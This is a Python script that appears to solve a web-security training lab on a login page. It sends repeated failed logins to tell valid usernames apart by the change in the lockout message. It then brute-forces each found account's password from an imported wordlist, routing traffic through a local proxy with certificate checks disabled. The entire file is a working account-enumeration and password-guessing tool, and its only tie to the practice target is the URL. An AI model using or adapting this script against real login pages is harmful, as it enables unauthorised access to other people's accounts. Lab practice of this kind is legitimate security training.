import requests,urllib3
from bs4 import BeautifulSoup
from credentials import usernames,passwords

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http" : "127.0.0.1:8080",
    "https" : "127.0.0.1:8080",
}

url = "https://0a3100c60471e6a681e81702009a003f.web-security-academy.net/login"


for username in usernames:
    
    for i in range(10):
        data = {
            "username" : username,
            "password" : "shfsiuhnisuu" # random password
        }
        response = requests.post(url=url,data=data,verify=False,proxies=proxies)
        soup = BeautifulSoup(response.text,"html.parser")
        target_msg = soup.find("p",class_="is-warning").text
        if target_msg != "Invalid username or password.":
            print("username = ",username)
            
            for password in passwords:
                data = {
                    "username" : username,
                    "password" : password,
            }
                response = requests.post(url=url,data=data,verify=False,proxies=proxies)

                if target_msg not in response.text:
                    print("password = ",password)
                    exit()

                